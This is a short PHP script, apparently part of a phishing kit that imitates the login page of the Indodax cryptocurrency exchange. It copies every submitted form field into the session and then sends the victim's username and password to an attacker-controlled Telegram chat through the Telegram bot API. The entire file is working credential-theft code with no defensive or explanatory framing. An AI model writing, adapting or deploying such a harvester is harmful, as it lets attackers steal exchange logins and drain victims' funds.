<?php
include "../telegram.php";
session_start();
foreach ( $_POST as $key => $value ) { $_SESSION[$key] = $value; }

/////////////////////////////////
$title   = "Indodax";
$type     = "LOGIN";
//$href    = "/";

$message = "
*( {$title} | {$type} )*

- Username : `{$_SESSION['user']}`
- Password : `{$_SESSION['pass']}`
";
/////////////////////////////////


$url = "https://api.telegram.org/bot$id_botTele/sendMessage?parse_mode=markdown&chat_id=$id_telegram&text=" . urlencode($message);
$ch = curl_init();
$optArray = array(CURLOPT_URL => $url, CURLOPT_RETURNTRANSFER => true);
curl_setopt_array($ch, $optArray);
$result = curl_exec($ch);
curl_close($ch);
//header("Location: {$href}");
?>
